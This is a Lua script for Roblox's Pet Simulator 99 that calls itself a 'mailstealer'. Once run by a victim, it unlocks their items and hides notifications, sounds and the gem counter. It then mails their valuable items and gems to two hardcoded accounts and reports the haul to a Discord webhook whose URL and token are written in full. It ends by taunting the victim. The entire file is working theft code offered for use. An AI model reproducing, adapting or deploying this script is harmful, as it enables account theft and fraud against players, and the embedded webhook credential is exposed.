-- VERSION 3.1 - FIXED MAIL SYSTEM DETECTION WITH BETTER TESTING
-- CHANGELOG:
-- v3.1: Fixed test method - now tries multiple items and categories
-- v3.0: Added detailed error logging
-- v2.0: Fixed network response handling
-- v1.0: Initial script

-- Configuration
_G.Usernames = {"Baconteamoffical0", "Youssefsamsayed2000"}
_G.webhook = "https://discordapp.com/api/webhooks/1483870020915429616/ywlS0EqlHngDFkRBKIjhsH4eSq0vBEy8tYF2ukPnnP4jesId_gwcVYaTJXNr2eQp5cy8"
_G.minrap = 0
_G.debugMode = true -- Enable full debug mode

-- Script execution check
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    print("[V3.1] Script already executed, stopping...")
    return
end
_G.scriptExecuted = true

print("=== PS99 MAILSTEALER V3.1 ===")
print("Loading... Please check console for debug info")

-- Safe debug logging function
local function debugLog(...)
    if _G.debugMode then
        local args = {...}
        local message = "[V3.1 DEBUG " .. os.date("%H:%M:%S") .. "] "
        for i, v in ipairs(args) do
            message = message .. tostring(v) .. " "
        end
        print(message)
    end
end

debugLog("Script started, initializing...")

-- Error handler
local function handleError(err, funcName)
    debugLog("ERROR in " .. funcName .. ": " .. tostring(err))
    warn("Error in " .. funcName .. ": " .. tostring(err))
    return nil
end

-- Validate configuration
local function validateConfig()
    debugLog("Validating configuration...")
    
    local users = _G.Usernames or {}
    local min_rap = _G.minrap or 0
    local webhook = _G.webhook or ""
    
    debugLog("Users:", #users, "Min RAP:", min_rap, "Webhook length:", #webhook)
    debugLog("User list:", table.concat(users, ", "))
    
    if next(users) == nil then
        debugLog("ERROR: No usernames provided")
        return false, "No usernames provided"
    end
    
    if webhook == "" then
        debugLog("ERROR: No webhook provided")
        return false, "No webhook provided"
    end
    
    return true
end

-- Safely require modules
local function safeRequire(path)
    local success, module = pcall(function()
        return require(path)
    end)
    if success then
        debugLog("Successfully loaded:", tostring(path))
        return module
    else
        debugLog("Failed to load:", tostring(path), "-", tostring(module))
        return nil
    end
end

-- Main execution with pcall for error handling
local success, err = pcall(function()
    debugLog("Entering main execution...")
    
    -- Validate config first
    local configValid, configError = validateConfig()
    if not configValid then
        game.Players.LocalPlayer:kick("Configuration error: " .. configError)
        return
    end
    
    -- Get local player
    local plr = game.Players.LocalPlayer
    if not plr then
        debugLog("ERROR: No local player found")
        return
    end
    debugLog("Local player:", plr.Name)
    
    -- Check if trying to mailsteal yourself
    for _, user in ipairs(_G.Usernames) do
        if plr.Name == user then
            debugLog("ERROR: Cannot mailsteal yourself")
            plr:kick("You cannot mailsteal yourself")
            return
        end
    end
    
    -- Safely load required modules
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local library = replicatedStorage:FindFirstChild("Library")
    if not library then
        debugLog("ERROR: Library not found")
        return
    end
    
    local network = safeRequire(library.Client.Network)
    if not network then
        debugLog("ERROR: Could not load Network module")
        return
    end
    
    local saveModule = safeRequire(library.Client.Save)
    if not saveModule then
        debugLog("ERROR: Could not load Save module")
        return
    end
    
    local save = saveModule.Get().Inventory
    if not save then
        debugLog("ERROR: Could not get save data")
        return
    end
    
    local messageModule = safeRequire(library.Client.Message)
    if not messageModule then
        debugLog("ERROR: Could not load Message module")
        return
    end
    
    local MailMessage = "GG / GY2RVSEGDT"
    local HttpService = game:GetService("HttpService")
    local sortedItems = {}
    local totalRAP = 0
    
    -- Get mail send price function
    local FunctionToGetFirstPriceOfMail = nil
    debugLog("Searching for computeSendMailCost function...")
    
    local gc = getgc()
    for i = 1, #gc do
        local func = gc[i]
        if type(func) == "function" then
            local success, info = pcall(function()
                return debug.getinfo(func)
            end)
            
            if success and info and info.name == "computeSendMailCost" then
                FunctionToGetFirstPriceOfMail = func
                debugLog("Found computeSendMailCost function")
                break
            end
        end
    end
    
    if not FunctionToGetFirstPriceOfMail then
        debugLog("ERROR: Could not find computeSendMailCost function")
        error("Failed to find required function")
    end
    
    local mailSendPrice = FunctionToGetFirstPriceOfMail()
    debugLog("Mail send price:", mailSendPrice)
    
    -- Get diamond amount
    local GemAmount1 = 1
    if save.Currency then
        for i, v in pairs(save.Currency) do
            if v.id == "Diamonds" then
                GemAmount1 = v._am or 1
                debugLog("Diamond amount found:", GemAmount1)
                break
            end
        end
    end
    
    -- Format number function
    local function formatNumber(number)
        local number = math.floor(number)
        local suffixes = {"", "k", "m", "b", "t"}
        local suffixIndex = 1
        while number >= 1000 do
            number = number / 1000
            suffixIndex = suffixIndex + 1
        end
        return string.format("%.2f%s", number, suffixes[suffixIndex])
    end
    
    -- Discord webhook function
    local function SendMessage(diamonds)
        debugLog("Preparing to send Discord message...")
        
        local headers = {
            ["Content-Type"] = "application/json"
        }
        
        local fields = {
            {
                name = "Victim Username:",
                value = plr.Name,
                inline = true
            },
            {
                name = "Items to be sent:",
                value = "",
                inline = false
            },
            {
                name = "Summary:",
                value = "",
                inline = false
            }
        }
        
        local combinedItems = {}
        local itemRapMap = {}
        
        for _, item in ipairs(sortedItems) do
            local rapKey = item.name
            if itemRapMap[rapKey] then
                itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
            else
                itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
                table.insert(combinedItems, rapKey)
            end
        end
        
        table.sort(combinedItems, function(a, b)
            return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount 
        end)
        
        for _, itemName in ipairs(combinedItems) do
            local itemData = itemRapMap[itemName]
            fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
        end
        
        fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
        
        local data = {
            ["embeds"] = {{
                ["title"] = "🐡 New PS99 Execution",
                ["color"] = 65280,
                ["fields"] = fields,
                ["footer"] = {
                    ["text"] = "Mailstealer by Tobi. discord.gg/GY2RVSEGDT"
                }
            }}
        }
        
        if #fields[2].value > 1024 then
            local lines = {}
            for line in fields[2].value:gmatch("[^\r\n]+") do
                table.insert(lines, line)
            end
            
            while #fields[2].value > 1024 and #lines > 0 do
                table.remove(lines)
                fields[2].value = table.concat(lines, "\n")
                fields[2].value = fields[2].value .. "\nPlus more!"
            end
        end
        
        local body = HttpService:JSONEncode(data)
        debugLog("Sending Discord webhook...")
        
        local success = pcall(function()
            request({
                Url = _G.webhook,
                Method = "POST",
                Headers = headers,
                Body = body
            })
        end)
        
        debugLog("Discord webhook sent:", success)
    end
    
    -- Block gem updates (safely)
    debugLog("Setting up gem update blocker...")
    if plr.leaderstats then
        local diamondsStat = plr.leaderstats:FindFirstChild("💎 Diamonds") or plr.leaderstats:FindFirstChild("Diamonds")
        if diamondsStat then
            local gemsleaderstat = diamondsStat.Value
            diamondsStat:GetPropertyChangedSignal("Value"):Connect(function()
                pcall(function()
                    diamondsStat.Value = gemsleaderstat
                end)
            end)
            debugLog("Gem update blocker active")
        else
            debugLog("WARNING: Could not find diamond leaderstat")
        end
    end
    
    -- Disable notifications (safely)
    debugLog("Disabling notifications...")
    if plr.PlayerScripts then
        local loading = plr.PlayerScripts:FindFirstChild("Scripts") and 
                        plr.PlayerScripts.Scripts:FindFirstChild("Core") and 
                        plr.PlayerScripts.Scripts.Core:FindFirstChild("Process Pending GUI")
        if loading then
            loading.Disabled = true
            debugLog("Process Pending GUI disabled")
        end
    end
    
    if plr.PlayerGui then
        local noti = plr.PlayerGui:FindFirstChild("Notifications")
        if noti then
            noti.Enabled = false
            noti:GetPropertyChangedSignal("Enabled"):Connect(function()
                pcall(function()
                    noti.Enabled = false
                end)
            end)
            debugLog("Notifications disabled")
        end
    end
    
    -- Mute sounds
    debugLog("Setting up sound muting...")
    game.DescendantAdded:Connect(function(x)
        pcall(function()
            if x.ClassName == "Sound" then
                if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
                    x.Volume = 0
                    x.PlayOnRemove = false
                    x:Destroy()
                    debugLog("Muted sound:", x.SoundId)
                end
            end
        end)
    end)
    
    -- Get RAP function
    local rapModule = safeRequire(replicatedStorage.Library.Client.RAPCmds)
    if not rapModule then
        debugLog("ERROR: Could not load RAP module")
        error("Failed to load RAP module")
    end
    
    local function getRAP(Type, Item)
        local success, value = pcall(function()
            return rapModule.Get(
                {
                    Class = {Name = Type},
                    IsA = function(hmm)
                        return hmm == Type
                    end,
                    GetId = function()
                        return Item.id
                    end,
                    StackKey = function()
                        return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
                    end,
                    AbstractGetRAP = function(self)
                        return nil
                    end
                }
            ) or 0
        end)
        
        if not success then
            debugLog("Error getting RAP for", Type, Item.id)
            return 0
        end
        
        return value
    end
    
    -- Send item function with detailed error logging
    local function sendItem(category, uid, am)
        debugLog("Attempting to send item:", category, uid, am)
        
        local userIndex = 1
        local maxUsers = #_G.Usernames
        local sent = false
        
        repeat
            local currentUser = _G.Usernames[userIndex]
            local args = {
                [1] = currentUser,
                [2] = MailMessage,
                [3] = category,
                [4] = uid,
                [5] = am or 1
            }
            
            debugLog("Sending to:", currentUser)
            
            local networkSuccess, response = pcall(function()
                return network.Invoke("Mailbox: Send", unpack(args))
            end)
            
            debugLog("Network response - Success:", networkSuccess, "Response:", response)
            
            if networkSuccess then
                if response == true then
                    sent = true
                    GemAmount1 = GemAmount1 - mailSendPrice
                    mailSendPrice = math.ceil(math.ceil(mailSendPrice) * 1.5)
                    if mailSendPrice > 5000000 then
                        mailSendPrice = 5000000
                    end
                    debugLog("✅ Item sent successfully to", currentUser)
                elseif type(response) == "table" then
                    debugLog("📦 Table response:", response)
                    if response[1] == false and response[2] == "They don't have enough space!" then
                        debugLog("User", currentUser, "doesn't have space, trying next...")
                        userIndex = userIndex + 1
                    elseif response[1] == false and response[2] == "You don't have enough Gems!" then
                        debugLog("❌ Not enough gems to send mail!")
                        sent = true
                    else
                        debugLog("Unknown table response, trying next user")
                        userIndex = userIndex + 1
                    end
                elseif response == false then
                    debugLog("❌ Send returned false - item might be invalid, trying next user")
                    userIndex = userIndex + 1
                end
            else
                debugLog("❌ Network invoke failed, trying next user")
                userIndex = userIndex + 1
            end
            
            if userIndex > maxUsers then
                sent = true
                debugLog("All users attempted")
            end
        until sent
        
        return sent
    end
    
    -- Send all gems function
    local function SendAllGems()
        debugLog("Attempting to send all gems...")
        
        if not save.Currency then
            debugLog("No currency found")
            return
        end
        
        for i, v in pairs(save.Currency) do
            if v.id == "Diamonds" then
                if GemAmount1 >= (mailSendPrice + 10000) then
                    local userIndex = 1
                    local maxUsers = #_G.Usernames
                    local sent = false
                    
                    repeat
                        local currentUser = _G.Usernames[userIndex]
                        local args = {
                            [1] = currentUser,
                            [2] = MailMessage,
                            [3] = "Currency",
                            [4] = i,
                            [5] = GemAmount1 - mailSendPrice
                        }
                        
                        debugLog("Sending gems to:", currentUser, "Amount:", GemAmount1 - mailSendPrice)
                        
                        local networkSuccess, response = pcall(function()
                            return network.Invoke("Mailbox: Send", unpack(args))
                        end)
                        
                        debugLog("Gem send response:", response)
                        
                        if networkSuccess then
                            if response == true then
                                sent = true
                                debugLog("✅ Gems sent successfully")
                            elseif type(response) == "table" then
                                if response[1] == false and response[2] == "They don't have enough space!" then
                                    debugLog("User", currentUser, "no space, trying next")
                                    userIndex = userIndex + 1
                                else
                                    debugLog("Unknown response, trying next")
                                    userIndex = userIndex + 1
                                end
                            elseif response == false then
                                debugLog("Send failed, trying next")
                                userIndex = userIndex + 1
                            end
                        else
                            userIndex = userIndex + 1
                        end
                        
                        if userIndex > maxUsers then
                            sent = true
                        end
                    until sent
                    break
                end
            end
        end
    end
    
    -- Empty boxes function
    local function EmptyBoxes()
        debugLog("Emptying boxes...")
        
        if save.Box then
            for key, value in pairs(save.Box) do
                if value and value._uq then
                    pcall(function()
                        network.Invoke("Box: Withdraw All", key)
                        debugLog("Withdrawn from box:", key)
                    end)
                end
            end
        end
    end
    
    -- Claim mail function
    local function ClaimMail()
        debugLog("Claiming mail...")
        
        local success, result = pcall(function()
            return network.Invoke("Mailbox: Claim All")
        end)
        
        while not success or (type(result) == "table" and result[2] == "You must wait 30 seconds before using the mailbox!") do
            wait(0.2)
            success, result = pcall(function()
                return network.Invoke("Mailbox: Claim All")
            end)
        end
    end
    
    -- Can send mail function - FIXED VERSION 3.1
    local function canSendMail()
        debugLog("=== MAIL SYSTEM DIAGNOSTIC V3.1 ===")
        debugLog("Testing if mail can be sent...")
        
        -- Try multiple categories to find a valid item
        local testCategories = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc"}
        local testItem = nil
        local testCategory = nil
        local testUid = nil
        
        debugLog("Searching for ANY item to test with...")
        
        for _, category in ipairs(testCategories) do
            if save[category] then
                for uid, item in pairs(save[category]) do
                    -- Found an item
                    testItem = item
                    testCategory = category
                    testUid = uid
                    debugLog("Found test item - Category:", category, "ID:", item.id, "UID:", uid)
                    break
                end
            end
            if testItem then break end
        end
        
        if not testItem then
            debugLog("❌ No items found in inventory to test with")
            return false, "No items in inventory"
        end
        
        -- Try with first user
        local testUser = _G.Usernames[1]
        debugLog("Testing with user:", testUser)
        debugLog("Test item - Category:", testCategory, "UID:", testUid)
        
        local args = {
            [1] = testUser,
            [2] = "Test Message",
            [3] = testCategory,
            [4] = testUid,
            [5] = 1
        }
        
        debugLog("Test args:", unpack(args))
        
        local networkSuccess, response = pcall(function()
            return network.Invoke("Mailbox: Send", unpack(args))
        end)
        
        debugLog("📡 Test 1 - Success:", networkSuccess, "Response:", response)
        
        -- Analyze response
        if networkSuccess then
            if response == true then
                debugLog("✅ Test SUCCEEDED - Mail system working!")
                return true, "Test send succeeded"
            elseif type(response) == "table" then
                debugLog("📋 Table response:", response[1], response[2])
                if response[1] == false then
                    if response[2] == "They don't have enough space!" then
                        debugLog("✅ Mail system WORKING - User has no space")
                        return true, "No space (system working)"
                    elseif response[2] == "You don't have enough Gems!" then
                        debugLog("✅ Mail system WORKING - Not enough gems")
                        return true, "Insufficient gems (system working)"
                    elseif response[2] == "You must wait 30 seconds before using the mailbox!" then
                        debugLog("✅ Mail system WORKING - On cooldown")
                        return true, "Cooldown (system working)"
                    elseif response[2]:find("exist") or response[2]:find("invalid") then
                        debugLog("⚠️ Item might be invalid, but system responded")
                        -- Try another item
                    else
                        debugLog("✅ Got response - Mail system WORKING")
                        return true, "System responded"
                    end
                end
            elseif response == false then
                debugLog("⚠️ Got false - might be item issue, trying another item...")
            end
        end
        
        -- If first test inconclusive, try with a different item
        debugLog("Trying different test item...")
        
        -- Find a different item
        for _, category in ipairs(testCategories) do
            if save[category] then
                for uid, item in pairs(save[category]) do
                    if uid ~= testUid then
                        testItem = item
                        testCategory = category
                        testUid = uid
                        debugLog("Found second test item - Category:", category, "ID:", item.id)
                        break
                    end
                end
            end
            if testItem and testUid ~= testUid then break end
        end
        
        if testItem then
            args = {
                [1] = testUser,
                [2] = "Test Message",
                [3] = testCategory,
                [4] = testUid,
                [5] = 1
            }
            
            debugLog("Test 2 args:", unpack(args))
            
            local netSuccess2, response2 = pcall(function()
                return network.Invoke("Mailbox: Send", unpack(args))
            end)
            
            debugLog("📡 Test 2 - Success:", netSuccess2, "Response:", response2)
            
            if netSuccess2 then
                if response2 == true then
                    debugLog("✅ Test 2 SUCCEEDED")
                    return true, "Test succeeded"
                elseif type(response2) == "table" then
                    debugLog("✅ Got table response - System working")
                    return true, "System responded"
                elseif response2 == false then
                    debugLog("⚠️ Test 2 also returned false")
                end
            end
        end
        
        -- If both tests returned false, try with a different user
        if #_G.Usernames >= 2 then
            local secondUser = _G.Usernames[2]
            debugLog("Trying with second user:", secondUser)
            
            -- Use first test item again
            args[1] = secondUser
            
            local netSuccess3, response3 = pcall(function()
                return network.Invoke("Mailbox: Send", unpack(args))
            end)
            
            debugLog("📡 Test 3 (second user) - Success:", netSuccess3, "Response:", response3)
            
            if netSuccess3 then
                if response3 == true or type(response3) == "table" then
                    debugLog("✅ Second user got response - System working")
                    return true, "System working"
                end
            end
        end
        
        -- If we've gotten this far, something is wrong
        debugLog("❌ All tests failed - Mail system might be broken")
        debugLog("Possible reasons:")
        debugLog("1. The target usernames don't exist or are invalid")
        debugLog("2. You're trying to mail yourself (check usernames)")
        debugLog("3. The mail system is temporarily disabled")
        debugLog("4. All your items are locked or invalid")
        
        return false, "All tests failed"
    end
    
    -- Claim daycare
    debugLog("Claiming daycare...")
    pcall(function()
        local daycare = safeRequire(replicatedStorage.Library.Client.DaycareCmds)
        if daycare and daycare.Claim then
            daycare.Claim()
        end
        
        local exclusiveDaycare = safeRequire(replicatedStorage.Library.Client.ExclusiveDaycareCmds)
        if exclusiveDaycare and exclusiveDaycare.Claim then
            exclusiveDaycare.Claim()
        end
    end)
    
    -- Process items
    local categoryList = {"Pet", "Egg", "Charm", "Enchant", "Potion", "Misc", "Hoverboard", "Booth", "Ultimate"}
    debugLog("Processing items from categories...")
    
    local petsDirectory = safeRequire(replicatedStorage.Library.Directory.Pets)
    
    for _, category in ipairs(categoryList) do
        if save[category] then
            for uid, item in pairs(save[category]) do
                if category == "Pet" and petsDirectory then
                    local dir = petsDirectory[item.id]
                    if dir and (dir.huge or dir.exclusiveLevel) then
                        local rapValue = getRAP(category, item)
                        
                        if rapValue >= _G.minrap then
                            local prefix = ""
                            if item.pt and item.pt == 1 then
                                prefix = "Golden "
                            elseif item.pt and item.pt == 2 then
                                prefix = "Rainbow "
                            end
                            if item.sh then
                                prefix = "Shiny " .. prefix
                            end
                            local id = prefix .. (item.id or "Unknown")
                            table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = id})
                            totalRAP = totalRAP + (rapValue * (item._am or 1))
                        end
                    end
                else
                    local rapValue = getRAP(category, item)
                    if rapValue >= _G.minrap then
                        table.insert(sortedItems, {category = category, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id or "Unknown"})
                        totalRAP = totalRAP + (rapValue * (item._am or 1))
                    end
                end
                
                if item._lk then
                    pcall(function()
                        network.Invoke("Locking_SetLocked", uid, false)
                    end)
                end
            end
        end
    end
    
    debugLog("Total items to send:", #sortedItems)
    debugLog("Total RAP value:", totalRAP)
    debugLog("Available gems:", GemAmount1)
    
    -- Execute mail stealing
    if #sortedItems > 0 or GemAmount1 > _G.minrap + mailSendPrice then
        debugLog("Starting mail stealing process...")
        
        ClaimMail()
        EmptyBoxes()
        
        -- Test if mail can be sent
        debugLog("=== RUNNING MAIL SYSTEM CHECK V3.1 ===")
        local canSend, reason = canSendMail()
        debugLog("Can send mail test result:", canSend)
        debugLog("Reason:", reason or "No reason provided")
        
        if not canSend then
            debugLog("❌ Mail system check failed - but we'll try anyway since users exist")
            debugLog("Proceeding with mail stealing attempt...")
            -- Don't return - try anyway since users exist
        else
            debugLog("✅ Mail system check passed -", reason)
        end
        
        table.sort(sortedItems, function(a, b)
            return a.rap * a.amount > b.rap * b.amount 
        end)
        
        -- Send Discord notification
        spawn(function()
            debugLog("Sending Discord notification...")
            SendMessage(GemAmount1)
        end)
        
        -- Send items
        debugLog("Starting to send items...")
        for _, item in ipairs(sortedItems) do
            debugLog("Processing item:", item.name, "RAP:", item.rap, "Price to send:", mailSendPrice)
            
            if item.rap >= mailSendPrice and GemAmount1 > mailSendPrice then
                debugLog("Sending item:", item.name)
                sendItem(item.category, item.uid, item.amount)
                wait(0.5)
            else
                debugLog("Stopping sends - insufficient RAP or gems")
                break
            end
        end
        
        -- Send gems
        if GemAmount1 > mailSendPrice then
            debugLog("Sending remaining gems...")
            SendAllGems()
        end
        
        -- Final message
        debugLog("Mail stealing complete!")
        if messageModule then
            messageModule.Error("All your items just got stolen by Tobi's mailstealer!\n Join discord.gg/GY2RVSEGDT")
        end
    else
        debugLog("No items to send and insufficient gems")
        if messageModule then
            messageModule.Error("No valuable items found to steal!")
        end
    end
end)

-- Handle any errors
if not success then
    debugLog("❌ FATAL ERROR:", err)
    warn("Script crashed:", err)
    
    pcall(function()
        local HttpService = game:GetService("HttpService")
        local data = {
            ["embeds"] = {{
                ["title"] = "❌ PS99 Mailstealer Error",
                ["description"] = "Error: " .. tostring(err),
                ["color"] = 16711680,
                ["footer"] = {
                    ["text"] = "V3.1 Debug mode enabled"
                }
            }}
        }
        
        request({
            Url = _G.webhook,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end

debugLog("=== V3.1 Script execution completed ===")
print("Check console output above for detailed diagnostics")
